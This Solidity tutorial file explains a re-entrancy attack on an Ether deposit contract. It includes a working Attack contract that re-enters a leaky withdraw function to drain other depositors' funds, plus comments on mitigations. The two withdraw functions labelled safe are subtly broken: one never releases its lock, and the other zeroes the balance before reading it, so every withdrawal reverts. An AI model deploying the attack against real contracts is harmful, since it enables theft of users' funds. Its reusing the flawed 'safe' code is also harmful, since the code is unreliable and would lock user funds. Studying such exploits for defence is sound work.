// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

// Based on https://solidity-by-example.org/hacks/re-entrancy

/*
ReentrantVulnerable is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy ReentrantVulnerable
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into ReentrantVulnerable
3. Deploy Attack with address of ReentrantVulnerable
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call ReentrantVulnerable.withdraw multiple times before
ReentrantVulnerable.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- ReentrantVulnerable.deposit
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack.fallback (receives 1 Ether)
- ReentrantVulnerable.withdraw
- Attack fallback (receives 1 Ether)
*/

/* 2 most common kinds of attacks:
    -> oracle attack - usually happens, when protocol doesn't use decentralized Oracle, but we use Chainlink 👍
    -> reentrancy attack - we discuss this issue here
    This types of attacks result in the most amount of money lost in crypto space
    www.rekt.news
*/

/* How to protect from reentrancy attack?
    1. Easy way
    Call any external contract call in the last step in your transaction
    In our case: In withdraw function first update balances to 0, before we call the external function

    2. Mutex way
        1) lock the piece of code using 'bool locked':
        2) Use OpenZeppelin library - modifier nonReentrant()

    !!! The best practice is ALWAYS do all state changes before we call external contract    
*/

/* //Commented for coverage skip
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract ReentrantVulnerable is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw_leaky() public payable {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    bool locked;

    function withdraw_safe1() public payable {
        require(!locked, "revert");
        locked = true;

        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function withdraw_safe2() public payable nonReentrant {
        balances[msg.sender] = 0;

        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable; // we grab ReentrantVulnerable contract

    constructor(address _reentrantVulnerableAddress) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw_leaky();
        // reentrantVulnerable.withdraw_safe1();
        // reentrantVulnerable.withdraw_safe2();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1 ether) {
            reentrantVulnerable.withdraw_leaky();
            // reentrantVulnerable.withdraw_safe1();
            // reentrantVulnerable.withdraw_safe2();
        }
    }

    receive() external payable {}
    // receive() external payable {}
    // With receive function, the contract is no more leacky
    // Comment receive() function to perform vulnerability test properly!
}
*/
